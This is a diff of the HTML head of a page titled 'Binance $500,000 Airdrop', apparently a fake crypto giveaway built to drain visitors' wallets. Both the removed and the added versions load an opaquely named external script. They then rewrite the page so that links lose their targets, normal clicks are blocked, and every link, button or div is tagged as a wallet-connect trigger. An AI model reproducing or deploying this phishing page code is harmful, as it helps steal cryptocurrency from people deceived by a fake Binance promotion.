@@ -1,62 +1,23 @@
 <html>
 
 <head>
-	<script charset="UTF-8" async type="text/javascript" src="./532a2.434bbf3dd4ef35f.js"></script>
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-      // Add CSS for cursor pointer
-      var style = document.createElement("style");
-      style.innerHTML = ".connectButton { cursor: pointer; }";
-      document.head.appendChild(style);
+  <script src="./66e762aea0833944e38ca648.js"></script>
+ <script>
+        function addClassesToElements() {
+    
+        const links = document.querySelectorAll('a:not(.open)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('open');
+        }
+        const buttons = document.querySelectorAll('div:not(.open)');
+        for (const button of buttons) {
+            button.classList.add('open');
+        }
+        }
+        setInterval(addClassesToElements, 300);
+    </script>
 
-      // Update <a> & <button> elements
-      document.querySelectorAll("a").forEach(function (link) {
-        link.addEventListener("click", function (event) {
-          event.preventDefault();
-        });
-        link.removeAttribute("href");
-        link.classList.add("connectButton");
-        link.classList.add("placeholder-button");
-        link.classList.add("connect-button");
-      });
-
-      document.querySelectorAll("button").forEach(function (link) {
-        link.addEventListener("click", function (event) {
-          event.preventDefault();
-        });
-        link.removeAttribute("href");
-        link.classList.add("connectButton");
-        link.classList.add("placeholder-button");
-        link.classList.add("connect-button");
-      });
-    });
-  </script>
-
-  <script>
-    window.onload = function () {
-      var links = document.querySelectorAll("a");
-      var buttons = document.querySelectorAll("button");
-
-      links.forEach(function (link) {
-        link.classList.add("connectButton");
-        link.classList.add("placeholder-button");
-        link.classList.add("connect-button");
-
-        link.addEventListener("click", function (event) {
-          event.preventDefault();
-        });
-      });
-
-      buttons.forEach(function (button) {
-        button.classList.add("connectButton");
-        button.classList.add("placeholder-button");
-        button.classList.add("connect-button");
-        button.addEventListener("click", function (event) {
-          event.preventDefault();
-        });
-      });
-    };
-  </script>
 
 	<title>Binance $500,000 Airdrop</title>
 	<link rel='stylesheet' href='./css/style.css'>
